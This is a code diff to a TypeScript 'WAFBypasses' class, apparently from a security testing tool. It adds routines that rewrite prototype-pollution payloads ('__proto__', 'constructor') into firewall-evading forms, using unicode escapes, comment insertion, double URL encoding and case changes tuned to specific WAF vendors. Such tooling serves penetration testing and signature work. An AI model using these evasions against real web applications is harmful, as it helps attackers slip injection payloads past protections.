@@ -291,6 +291,17 @@ export class WAFBypasses {
 		bypasses.push(payload.replace(/'/g, '\uFF07'));
 		bypasses.push(payload.replace(/"/g, '\uFF02'));
 
+		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
+		// Note: Bypasses with comments/escapes are for WAF signature testing, not backend execution.
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
+			bypasses.push(payload.replace(/__proto__/gi, '\\u005f\\u005fproto\\u005f\\u005f'));
+			bypasses.push(payload.replace(/__proto__/gi, '__pro__proto__to__'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'const\\u0072uctor'));
+		}
+
 		return [...new Set(bypasses)];
 	}
 
@@ -309,6 +320,12 @@ export class WAFBypasses {
 		bypasses.push(payload.normalize('NFKD'));
 		bypasses.push(payload.normalize('NFKC'));
 
+		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
+			bypasses.push(payload.replace(/__proto__/gi, 'const\\u0072uctor[prot\\u006ftype]'));
+		}
+
 		return [...new Set(bypasses)];
 	}
 
@@ -325,6 +342,16 @@ export class WAFBypasses {
 
 		// Case sensitivity exploits
 		bypasses.push(this.randomCase(payload));
+
+		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
+		// Note: Bypasses with comments/escapes are for WAF signature testing, not backend execution.
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__pr/**/oto__'));
+			bypasses.push(payload.replace(/__proto__/gi, '__pr/*comment*/oto__'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'const/**/ructor'));
+		}
 
 		return [...new Set(bypasses)];
 	}
@@ -348,6 +375,12 @@ export class WAFBypasses {
 		// Akamai specific: double URL encode only special chars
 		bypasses.push(payload.replace(/['"<>&]/g, (char) => encodeURIComponent(encodeURIComponent(char))));
 
+		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f'));
+			bypasses.push(payload.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+		}
+
 		return [...new Set(bypasses)];
 	}
 
@@ -367,6 +400,13 @@ export class WAFBypasses {
 
 		// Null byte injection (sometimes works on older Azure rules)
 		bypasses.push(payload + '%00');
+
+		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
+		// Note: Bypasses with comments/escapes are for WAF signature testing, not backend execution.
+		if (/__proto__/i.test(payload)) {
+			bypasses.push(payload.replace(/__proto__/gi, '__PrOtO__'));
+			bypasses.push(payload.replace(/__proto__/gi, '__pr/**/oto__'));
+		}
 
 		return [...new Set(bypasses)];
 	}
